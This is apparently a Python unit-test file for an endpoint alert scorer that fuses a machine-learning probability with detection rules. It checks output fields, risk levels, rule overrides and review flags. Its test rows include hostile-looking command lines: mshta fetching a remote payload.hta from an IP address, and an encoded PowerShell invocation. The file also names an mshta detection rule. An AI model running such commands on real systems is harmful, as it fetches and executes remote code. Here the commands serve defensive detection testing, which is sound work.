"""Unit tests for the fused alert-record contract (Saif, Data & ML)."""

import json
import os
import sys
import unittest

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.alert_scoring import (  # noqa: E402
    ALERT_FIELDS,
    AlertScorer,
    score_dataframe,
    score_event,
)


def base_row(**overrides):
    row = {
        "record_id": "vm_test_0001",
        "scenario_id": "BEN-001",
        "process_name": "cmd.exe",
        "parent_process": "explorer.exe",
        "command_line": "cmd.exe /c whoami",
        "User": "WIN11-TEST\\testuser",
    }
    row.update(overrides)
    return row


class TestScoreEventContract(unittest.TestCase):
    def setUp(self):
        self.scorer = AlertScorer()

    def test_returns_exact_alert_fields(self):
        alert = self.scorer.score(base_row(), xgb_proba=0.1)
        self.assertEqual(list(alert.keys()), ALERT_FIELDS)

    def test_json_serialisable(self):
        alert = score_event(base_row(), xgb_proba=0.9, scorer=self.scorer)
        json.dumps(alert)  # must not raise

    def test_high_proba_flags_and_is_high_risk(self):
        alert = self.scorer.score(base_row(), xgb_proba=0.99)
        self.assertEqual(alert["xgb_pred"], 1)
        self.assertEqual(alert["hybrid_score"], 1)
        self.assertEqual(alert["decision"], "malicious")
        self.assertEqual(alert["risk"], "high")

    def test_low_proba_and_no_rule_is_low_risk(self):
        alert = self.scorer.score(base_row(), xgb_proba=0.01)
        self.assertEqual(alert["xgb_pred"], 0)
        self.assertEqual(alert["rule_matched"], False)
        self.assertEqual(alert["hybrid_score"], 0)
        self.assertEqual(alert["decision"], "benign")
        self.assertEqual(alert["risk"], "low")

    def test_high_severity_rule_alone_sets_hybrid(self):
        row = base_row(
            process_name="mshta.exe",
            parent_process="explorer.exe",
            command_line="mshta.exe http://198.51.100.7/payload.hta",
        )
        alert = self.scorer.score(row, xgb_proba=0.01)
        self.assertEqual(alert["rule_matched"], True)
        self.assertIn("RULE-MSHTA-001", alert["rule_ids"])
        self.assertIn("T1218.005", alert["attack_techniques"])
        self.assertEqual(alert["model_pred"], 0)
        self.assertEqual(alert["hybrid_score"], 1)  # rule override
        self.assertEqual(alert["decision"], "malicious")
        self.assertEqual(alert["risk"], "high")
        self.assertEqual(alert["review_required"], True)  # arms disagree

    def test_rule_and_model_agree_no_review(self):
        row = base_row(
            process_name="powershell.exe",
            command_line="powershell -enc " + "A" * 32,
        )
        alert = self.scorer.score(row, xgb_proba=0.95)
        self.assertEqual(alert["rule_matched"], True)
        self.assertEqual(alert["model_pred"], 1)
        self.assertEqual(alert["review_required"], False)

    def test_missing_parent_requires_review(self):
        alert = self.scorer.score(base_row(parent_process=""), xgb_proba=0.01)
        self.assertEqual(alert["review_required"], True)
        self.assertTrue(any("parent process unavailable" in e for e in alert["evidence"]))

    def test_missing_model_columns_raises_clear_error(self):
        with self.assertRaises(ValueError):
            self.scorer.score({"command_line": "whoami"}, xgb_proba=None)

    def test_no_rule_evidence_text(self):
        alert = self.scorer.score(base_row(), xgb_proba=0.01)
        self.assertIn("no rule matched", alert["evidence"])

    def test_scores_are_not_ground_truth(self):
        # passing labels must not influence the decision
        row_plain = base_row(xgb_proba=0.01)
        row_labelled = base_row(xgb_proba=0.01, expected_label=1, technique_expected="T1059")
        a = self.scorer.score(row_plain, xgb_proba=0.01)
        b = self.scorer.score(row_labelled, xgb_proba=0.01)
        self.assertEqual(a["decision"], b["decision"])
        self.assertNotIn("expected_label", b)
        self.assertNotIn("technique_expected", b)


class TestBatchScoring(unittest.TestCase):
    def test_batch_with_stored_probabilities(self):
        df = pd.DataFrame([
            {**base_row(record_id="e1"), "proba": 0.99, "true": 1},
            {**base_row(record_id="e2"), "proba": 0.01, "true": 0},
        ])
        out = score_dataframe(
            df, proba_col="proba", label_col="true", scorer=AlertScorer()
        )
        self.assertEqual(len(out), 2)
        for col in ALERT_FIELDS:
            self.assertIn(col, out.columns)
        self.assertEqual(out.iloc[0]["decision"], "malicious")
        self.assertEqual(out.iloc[1]["decision"], "benign")
        self.assertNotIn("proba", out.columns)
        self.assertNotIn("true", out.columns)


if __name__ == "__main__":
    unittest.main()
